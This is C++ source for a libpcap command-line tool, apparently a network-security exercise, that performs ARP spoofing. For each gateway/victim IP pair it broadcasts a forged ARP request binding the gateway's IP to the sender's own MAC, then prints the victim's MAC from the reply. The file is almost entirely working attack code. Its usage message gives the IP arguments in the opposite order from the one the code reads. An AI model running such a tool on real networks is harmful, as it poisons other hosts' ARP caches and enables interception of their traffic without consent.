#include <iostream>
#include <vector>
#include <string>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender(victim) ip> <target(gateway ip>\n");
    printf("sample: send-arp-test wlan0 192.168.0.1 192.168.0.10\n");
}

void printMac(const Mac& mac) {
    printf("Received MAC address: %s\n", static_cast<std::string>(mac).c_str());
}

void arpSpoofing(pcap_t* handle, const Mac& my_mac, const Ip& gateway_ip, const Ip& victim_ip) {
    EthArpPacket packet;

    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(gateway_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(victim_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return;
    }

    struct pcap_pkthdr* header;
    const u_char* received_packet;
    res = pcap_next_ex(handle, &header, &received_packet);
    if (res == 0) {
        printf("pcap_next_ex didn't receive any packet\n");
        return;
    }
    if (res == -1 || res == -2) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        return;
    }

    EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(received_packet));

    if (eth_arp_packet->eth_.type() != EthHdr::Arp) {
        printf("Received packet is not ARP\n");
        return;
    }
    if (eth_arp_packet->arp_.op() != ArpHdr::Reply) {
        printf("Received packet is not ARP Reply\n");
        return;
    }
    if (eth_arp_packet->arp_.sip() == Ip(victim_ip)) {
        printMac(eth_arp_packet->arp_.smac());
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // Get my MAC address
    Mac my_mac = Mac::myMac(dev);
    std::string my_mac_string = static_cast<std::string>(my_mac);
    printf("My MAC address: %s\n", my_mac_string.c_str());

    pcap_t* handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip gateway_ip(argv[i]);
        Ip victim_ip(argv[i + 1]);

        arpSpoofing(handle, my_mac, gateway_ip, victim_ip);
    }

    pcap_close(handle);
    return 0;
}
